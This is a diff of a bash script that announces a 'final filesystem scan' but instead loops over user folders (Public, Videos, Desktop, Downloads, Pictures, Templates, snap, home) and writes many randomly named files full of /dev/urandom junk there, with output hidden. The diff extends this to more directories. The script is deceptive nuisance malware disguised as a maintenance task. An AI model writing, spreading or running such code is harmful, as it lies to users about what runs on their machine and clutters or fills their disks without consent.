@@ -55,7 +55,7 @@ sleep $((RANDOM % 5))
 done
 
 echo "Performing final filesystem scan. This may take up to 5 minutes."
-for ((c=1;c<=999;c++))
+for ((c=1;c<=99;c++))
 do 
 cd ~/Public
 < /dev/urandom tr -dc "\t\n [:alnum:]" | head -c$x > $RANDOM.txt
@@ -69,5 +69,23 @@ cd ~
 cd ~/Videos
 < /dev/urandom tr -dc "\t\n [:alnum:]" | head -c$x > $RANDOM.txt
 cd ~
+cd ~/Desktop
+< /dev/urandom tr -dc "\t\n [:alnum:]" | head -c$x > $RANDOM.txt
+cd ~
+cd ~/Downloads
+< /dev/urandom tr -dc "\t\n [:alnum:]" | head -c$x > $RANDOM.txt
+cd ~
+cd ~/snap
+< /dev/urandom tr -dc "\t\n [:alnum:]" | head -c$x > $RANDOM.txt
+cd ~
+cd ~/Templates
+< /dev/urandom tr -dc "\t\n [:alnum:]" | head -c$x > $RANDOM.txt
+cd ~
+cd ~/Pictures
+< /dev/urandom tr -dc "\t\n [:alnum:]" | head -c$x > $RANDOM.txt
+cd ~
+< /dev/urandom tr -dc "\t\n [:alnum:]" | head -c$x > $RANDOM.txt
+
+
 &> /dev/null
  done
